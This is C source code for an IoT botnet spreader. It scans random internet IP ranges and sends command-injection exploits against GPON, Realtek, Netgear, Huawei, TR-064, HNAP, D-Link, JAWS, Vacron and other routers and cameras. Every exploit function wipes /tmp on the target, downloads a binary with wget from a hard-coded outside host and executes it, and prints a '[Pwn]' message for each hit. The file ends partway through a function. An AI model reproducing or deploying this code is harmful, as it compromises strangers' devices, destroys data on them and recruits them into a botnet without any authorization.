#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

int GPON1_Range [] = {187,189,200,201,207};
int GPON2_Range [] = {1,2,5,31,37,41,42,58,62,78,82,84,88,89,91,92,95,103,113,118,145,147,178,183,185,195,210,212};

int exploit_pid, scanner2_pid, scanner3_pid, scanner4_pid, scanner5_pid, scanner6_pid, scanner7_pid, scanner8_pid, scanner9_pid, scanner10_pid, scanner11_pid, scanner12_pid, scanner13_pid, timeout = 100000;
static uint8_t ipState[40] = {0};
int max = 0, i = 0;

int socket_connect_tcp(char *host, in_port_t port) // tcp socket for sending POST/GET requests
{
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;
    struct timeval timeout;
    timeout.tv_sec = 3; // 3 sec timeout on socket
    timeout.tv_usec = 0;
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}


void exploit_socket_gpon8080(unsigned char *host)
{
    scanner3_pid = fork();

    if (scanner3_pid > 0 || scanner3_pid == -1)
        return;

	int gpon_socket1;
	char gpon_request1[1024];

	gpon_socket1 = socket_connect_tcp((char *)host, 8080);

	sprintf(gpon_request1, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nContent-Length: 118\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://185.62.188.233/m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0");

	if (gpon_socket1 != 0)
	{
		write(gpon_socket1, gpon_request1, strlen(gpon_request1));
		usleep(200000);
		close(gpon_socket1);
		printf("[Pwn] Found Exploitable Device %s [GPON] [8080]\n", host);
	}
	exit(0);
}

void exploit_socket_gpon80(unsigned char *host)
{
    scanner4_pid = fork();

    if (scanner4_pid > 0 || scanner4_pid == -1)
        return;

	int gpon_socket2;
	char gpon_request2[1024];

	gpon_socket2 = socket_connect_tcp((char *)host, 80);

	sprintf(gpon_request2, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 127.0.0.1:80\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nContent-Length: 118\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://185.62.188.233/m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0");

	if (gpon_socket2 != 0)
	{
		write(gpon_socket2, gpon_request2, strlen(gpon_request2));
		usleep(200000);
		close(gpon_socket2);
		printf("[Pwn] Found Exploitable Device %s [GPON] [80]\n", host);
	}
	exit(0);
}

void exploit_socket_realtek(unsigned char *host)
{
    scanner5_pid = fork();

    if (scanner5_pid > 0 || scanner5_pid == -1)
        return;

	int realtek_socket;
	char realtek_request[1024], realtek_request2[1024];

	realtek_socket = socket_connect_tcp((char *)host, 52869);

	sprintf(realtek_request, "POST /picsdesc.xml HTTP/1.1\r\nHost: %s:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf*; wget http://185.62.188.233/m`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", host);
	sprintf(realtek_request2, "POST /picsdesc.xml HTTP/1.1\r\nHost: %s:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/;chmod +x mips;./mips`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", host);

	if (realtek_socket != 0)
	{
		write(realtek_socket, realtek_request, strlen(realtek_request));
		sleep(5);
		write(realtek_socket, realtek_request2, strlen(realtek_request2));
		usleep(200000);
		close(realtek_socket);
		printf("[Pwn] Found Exploitable Device %s [REALTEK] [52869]\n", host);
	}
	exit(0);
}

void exploit_socket_netgear(unsigned char *host)
{
    scanner6_pid = fork();

    if (scanner6_pid > 0 || scanner6_pid == -1)
        return;

	int netgear_socket, netgear_socket2;
	char netgear_request[1024];

	netgear_socket = socket_connect_tcp((char *)host, 8080);
	netgear_socket2 = socket_connect_tcp((char *)host, 80);

	sprintf(netgear_request, "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://185.62.188.233/m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n");

	if (netgear_socket != 0)
	{
		write(netgear_socket, netgear_request, strlen(netgear_request));
		usleep(200000);
		close(netgear_socket);
		printf("[Pwn] Found Exploitable Device %s [NETGEAR] [8080]\n", host);
	}
	if (netgear_socket2 != 0)
	{
		write(netgear_socket2, netgear_request, strlen(netgear_request));
		usleep(200000);
		close(netgear_socket2);
		printf("[Pwn] Found Exploitable Device %s [NETGEAR] [80]\n", host);
	}
	exit(0);
}

void exploit_socket_huawei(unsigned char *host)
{
    scanner6_pid = fork();

    if (scanner6_pid > 0 || scanner6_pid == -1)
        return;

	int huawei_socket;
	char huawei_request[1024];

	huawei_socket = socket_connect_tcp((char *)host, 37215);

	sprintf(huawei_request, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %s:37215\r\nContent-Length: 601\r\nConnection: keep-alive\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.62.188.233 -l /tmp/huawei -r /m;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>", host);

	if (huawei_socket != 0)
	{
		write(huawei_socket, huawei_request, strlen(huawei_request));
		usleep(200000);
		close(huawei_socket);
		printf("[Pwn] Found Exploitable Device %s [HUAWEI] [37215]\n", host);
	}
	exit(0);
}

void exploit_socket_tr064(unsigned char *host)
{
    scanner7_pid = fork();

    if (scanner7_pid > 0 || scanner7_pid == -1)
        return;

	int tr064_socket, tr064_socket2;
	char tr064_request[1024], tr064_request2[1024];

	tr064_socket = socket_connect_tcp((char *)host, 7574);
	tr064_socket2 = socket_connect_tcp((char *)host, 5555);

	sprintf(tr064_request, "POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7574\r\nUser-Agent: Hello, world\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 640\r\n\r\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://185.62.188.233/tr064 && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>");
	sprintf(tr064_request2, "POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:5555\r\nUser-Agent: Hello, world\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 640\r\n\r\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://185.62.188.233/tr064 && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>");

	if (tr064_socket != 0)
	{
		write(tr064_socket, tr064_request, strlen(tr064_request));
		usleep(200000);
		close(tr064_socket);
		printf("[Pwn] Found Exploitable Device %s [TR-064] [7574]\n", host);
	}
	if (tr064_socket2 != 0)
	{
		write(tr064_socket2, tr064_request2, strlen(tr064_request2));
		usleep(200000);
		close(tr064_socket2);
		printf("[Pwn] Found Exploitable Device %s [TR-064] [5555]\n", host);
	}
	exit(0);
}

void exploit_socket_hnap(unsigned char *host)
{
    scanner8_pid = fork();

    if (scanner8_pid > 0 || scanner8_pid == -1)
        return;

	int hnap_socket;
	char hnap_request[1024];

	hnap_socket = socket_connect_tcp((char *)host, 80);

	sprintf(hnap_request, "POST /HNAP1/ HTTP/1.0\r\nHost: %s:80\r\nContent-Type: text/xml; charset=\"utf-8\"\r\nSOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://185.62.188.233/m && chmod 777 /tmp/m && /tmp/m`\r\nContent-Length: 640\r\n\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>\r\n\r\n", host);

	if (hnap_socket != 0)
	{
		write(hnap_socket, hnap_request, strlen(hnap_request));
		usleep(200000);
		close(hnap_socket);
		printf("[Pwn] Found Exploitable Device %s [HNAP] [80]\n", host);
	}
	exit(0);
}

void exploit_socket_crossweb(unsigned char *host)
{
    scanner9_pid = fork();

    if (scanner9_pid > 0 || scanner9_pid == -1)
        return;

	int crossweb_socket;
	char crossweb_request[1024];

	crossweb_socket = socket_connect_tcp((char *)host, 81);

	sprintf(crossweb_request, "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://185.62.188.233/a;sh${IFS}/tmp/a&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n");

	if (crossweb_socket != 0)
	{
		write(crossweb_socket, crossweb_request, strlen(crossweb_request));
		usleep(200000);
		close(crossweb_socket);
		printf("[Pwn] Found Exploitable Device %s [CROSSWEB] [81]\n", host);
	}
	exit(0);
}

void exploit_socket_jaws(unsigned char *host)
{
    scanner10_pid = fork();

    if (scanner10_pid > 0 || scanner10_pid == -1)
        return;

	int jaws_socket;
	char jaws_request[1024];

	jaws_socket = socket_connect_tcp((char *)host, 80);

	sprintf(jaws_request, "GET /shell?cd+/tmp;rm+-rf+*;wget+http://185.62.188.233/a;chmod+777+a;/tmp/a HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: %s:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n", host);

	if (jaws_socket != 0)
	{
		write(jaws_socket, jaws_request, strlen(jaws_request));
		usleep(200000);
		close(jaws_socket);
		printf("[Pwn] Found Exploitable Device %s [JAWS] [80]\n", host);
	}
	exit(0);
}

void exploit_socket_dlink(unsigned char *host)
{
    scanner11_pid = fork();

    if (scanner11_pid > 0 || scanner11_pid == -1)
        return;

	int dlink_socket;
	char dlink_request[1024];

	dlink_socket = socket_connect_tcp((char *)host, 49152);

	sprintf(dlink_request, "POST /soap.cgi?service=WANIPConn1 HTTP/1.1\r\nHost: %s:49152\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://185.62.188.233/m;chmod +x m;/tmp/m`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>\r\n\r\n", host);

	if (dlink_socket != 0)
	{
		write(dlink_socket, dlink_request, strlen(dlink_request));
		usleep(200000);
		close(dlink_socket);
		printf("Pwn] Found Exploitable Device %s [DLINK] [49152]\n", host);
	}
	exit(0);
}

void exploit_socket_r7064(unsigned char *host)
{
    scanner12_pid = fork();

    if (scanner12_pid > 0 || scanner12_pid == -1)
        return;

	int r7064_socket;
	char r7064_request[1024];

	r7064_socket = socket_connect_tcp((char *)host, 8443);

	sprintf(r7064_request, "GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://185.62.188.233/m;${IFS}sh${IFS}/var/tmp/m");

	if (r7064_socket != 0)
	{
		write(r7064_socket, r7064_request, strlen(r7064_request));
		usleep(200000);
		close(r7064_socket);
		printf("[Pwn] Found Exploitable Device %s [R7064] [8443]\n", host);
	}
	exit(0);
}

void exploit_socket_vacron(unsigned char *host)
{
    scanner13_pid = fork();

    if (scanner13_pid > 0 || scanner13_pid == -1)
        return;

	int vacron_socket;
	char vacron_request[1024];

	vacron_socket = socket_connect_tcp((char *)host, 8080);

	sprintf(vacron_request, "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://185.62.188.233/a;chmod+777+a;/tmp/a");

	if (vacron_socket != 0)
	{
		write(vacron_socket, vacron_request, strlen(vacron_request));
		usleep(200000);
		close(vacron_socket);
		printf("Pwn] Found Exploitable Device %s [VACRON] [8080]\n", host);
	}
	exit(0);
}
void GPON8080_IPGen()
{
	char gpon_ip1[16] = {0};char gpon_ip2[16] = {0};char gpon_ip3[16] = {0};
	char gpon_ip4[16] = {0};char gpon_ip5[16] = {0};char gpon_ip6[16] = {0};

	srand(time(NULL));
	int gpon_range1 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range2 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range3 = rand() % (sizeof(GPON1_Range)/sizeof(char *));
	int gpon_range4 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range5 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range6 = rand() % (sizeof(GPON1_Range)/sizeof(char *));

	ipState[0] = GPON1_Range[gpon_range1];ipState[4] = GPON1_Range[gpon_range2];ipState[8] = GPON1_Range[gpon_range3];
	ipState[12] = GPON1_Range[gpon_range4];ipState[16] = GPON1_Range[gpon_range5];ipState[20] = GPON1_Range[gpon_range6];
	ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;
	ipState[9] = rand() % 255;ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[13] = rand() % 255;ipState[14] = rand() % 255;ipState[15] = rand() % 255;
	ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;

	sprintf(gpon_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(gpon_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(gpon_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(gpon_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(gpon_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(gpon_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);

	exploit_socket_gpon8080(gpon_ip1);exploit_socket_gpon8080(gpon_ip2);exploit_socket_gpon8080(gpon_ip3);exploit_socket_gpon8080(gpon_ip4);exploit_socket_gpon8080(gpon_ip5);exploit_socket_gpon8080(gpon_ip6);
}

void GPON80_IPGen()
{
	char gpon2_ip1[16] = {0};char gpon2_ip2[16] = {0};char gpon2_ip3[16] = {0};
	char gpon2_ip4[16] = {0};char gpon2_ip5[16] = {0};char gpon2_ip6[16] = {0};

	srand(time(NULL));
	int gpon2_range1 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range2 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range3 = rand() % (sizeof(GPON2_Range)/sizeof(char *));
	int gpon2_range4 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range5 = rand() % (sizeof(GPON2_Range)/sizeof(char *));int gpon2_range6 = rand() % (sizeof(GPON2_Range)/sizeof(char *));

	ipState[0] = GPON2_Range[gpon2_range1];ipState[4] = GPON2_Range[gpon2_range2];ipState[8] = GPON2_Range[gpon2_range3];
	ipState[12] = GPON2_Range[gpon2_range4];ipState[16] = GPON2_Range[gpon2_range5];ipState[20] = GPON2_Range[gpon2_range6];
	ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;
	ipState[9] = rand() % 255;ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[13] = rand() % 255;ipState[14] = rand() % 255;ipState[15] = rand() % 255;
	ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;

	sprintf(gpon2_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(gpon2_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(gpon2_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(gpon2_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(gpon2_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(gpon2_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);

	exploit_socket_gpon80(gpon2_ip1);exploit_socket_gpon80(gpon2_ip2);exploit_socket_gpon80(gpon2_ip3);exploit_socket_gpon80(gpon2_ip4);exploit_socket_gpon80(gpon2_ip5);exploit_socket_gpon80(gpon2_ip6);
}

void REALTEK_IPGen()
{
	char realtek_ip1[16] = {0};char realtek_ip2[16] = {0};char realtek_ip3[16] = {0};char realtek_ip4[16] = {0};char realtek_ip5[16] = {0};
	char realtek_ip6[16] = {0};char realtek_ip7[16] = {0};char realtek_ip8[16] = {0};char realtek_ip9[16] = {0};char realtek_ip10[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[4] = rand() % 233;
	ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;ipState[8] = rand() % 233;ipState[9] = rand() % 255;
	ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[12] = rand() % 233;ipState[13] = rand() % 255;ipState[14] = rand() % 255;
	ipState[15] = rand() % 255;ipState[16] = rand() % 233;ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;
	ipState[20] = rand() % 233;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;ipState[24] = rand() % 233;
	ipState[25] = rand() % 255;ipState[26] = rand() % 255;ipState[27] = rand() % 255;ipState[28] = rand() % 233;ipState[29] = rand() % 255;
	ipState[30] = rand() % 255;ipState[31] = rand() % 255;ipState[32] = rand() % 233;ipState[33] = rand() % 255;ipState[34] = rand() % 255;
	ipState[35] = rand() % 255;ipState[36] = rand() % 233;ipState[37] = rand() % 255;ipState[38] = rand() % 255;ipState[39] = rand() % 255;

	sprintf(realtek_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(realtek_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(realtek_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(realtek_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(realtek_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(realtek_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);
	sprintf(realtek_ip7, "%d.%d.%d.%d", ipState[24], ipState[25], ipState[26], ipState[27]);sprintf(realtek_ip8, "%d.%d.%d.%d", ipState[28], ipState[29], ipState[30], ipState[31]);
	sprintf(realtek_ip9, "%d.%d.%d.%d", ipState[32], ipState[33], ipState[34], ipState[35]);sprintf(realtek_ip10, "%d.%d.%d.%d", ipState[36], ipState[37], ipState[38], ipState[39]);

	exploit_socket_realtek(realtek_ip1);exploit_socket_realtek(realtek_ip2);exploit_socket_realtek(realtek_ip3);exploit_socket_realtek(realtek_ip4);exploit_socket_realtek(realtek_ip5);
	exploit_socket_realtek(realtek_ip6);exploit_socket_realtek(realtek_ip7);exploit_socket_realtek(realtek_ip8);exploit_socket_realtek(realtek_ip9);exploit_socket_realtek(realtek_ip10);
}

void NETGEAR_IPGen()
{
	char netgear_ip1[16] = {0};char netgear_ip2[16] = {0};char netgear_ip3[16] = {0};char netgear_ip4[16] = {0};char netgear_ip5[16] = {0};
	char netgear_ip6[16] = {0};char netgear_ip7[16] = {0};char netgear_ip8[16] = {0};char netgear_ip9[16] = {0};char netgear_ip10[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[4] = rand() % 233;
	ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;ipState[8] = rand() % 233;ipState[9] = rand() % 255;
	ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[12] = rand() % 233;ipState[13] = rand() % 255;ipState[14] = rand() % 255;
	ipState[15] = rand() % 255;ipState[16] = rand() % 233;ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;
	ipState[20] = rand() % 233;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;ipState[24] = rand() % 233;
	ipState[25] = rand() % 255;ipState[26] = rand() % 255;ipState[27] = rand() % 255;ipState[28] = rand() % 233;ipState[29] = rand() % 255;
	ipState[30] = rand() % 255;ipState[31] = rand() % 255;ipState[32] = rand() % 233;ipState[33] = rand() % 255;ipState[34] = rand() % 255;
	ipState[35] = rand() % 255;ipState[36] = rand() % 233;ipState[37] = rand() % 255;ipState[38] = rand() % 255;ipState[39] = rand() % 255;

	sprintf(netgear_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(netgear_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(netgear_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(netgear_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(netgear_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(netgear_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);
	sprintf(netgear_ip7, "%d.%d.%d.%d", ipState[24], ipState[25], ipState[26], ipState[27]);sprintf(netgear_ip8, "%d.%d.%d.%d", ipState[28], ipState[29], ipState[30], ipState[31]);
	sprintf(netgear_ip9, "%d.%d.%d.%d", ipState[32], ipState[33], ipState[34], ipState[35]);sprintf(netgear_ip10, "%d.%d.%d.%d", ipState[36], ipState[37], ipState[38], ipState[39]);

	exploit_socket_netgear(netgear_ip1);exploit_socket_netgear(netgear_ip2);exploit_socket_netgear(netgear_ip3);exploit_socket_netgear(netgear_ip4);exploit_socket_netgear(netgear_ip5);
	exploit_socket_netgear(netgear_ip6);exploit_socket_netgear(netgear_ip7);exploit_socket_netgear(netgear_ip8);exploit_socket_netgear(netgear_ip9);exploit_socket_netgear(netgear_ip10);
}

void HUAWEI_IPGen()
{
	char huawei_ip1[16] = {0};char huawei_ip2[16] = {0};char huawei_ip3[16] = {0};char huawei_ip4[16] = {0};char huawei_ip5[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[4] = rand() % 233;
	ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;ipState[8] = rand() % 233;ipState[9] = rand() % 255;
	ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[12] = rand() % 233;ipState[13] = rand() % 255;ipState[14] = rand() % 255;
	ipState[15] = rand() % 255;ipState[16] = rand() % 233;ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;

	sprintf(huawei_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(huawei_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(huawei_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(huawei_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(huawei_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);

	exploit_socket_huawei(huawei_ip1);
	exploit_socket_huawei(huawei_ip2);
	exploit_socket_huawei(huawei_ip3);
	exploit_socket_huawei(huawei_ip4);
	exploit_socket_huawei(huawei_ip5);
}

void TR064_IPGen()
{
	char tr_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(tr_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_tr064(tr_ip1);
}

void HNAP_IPGen()
{
	char hnap_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
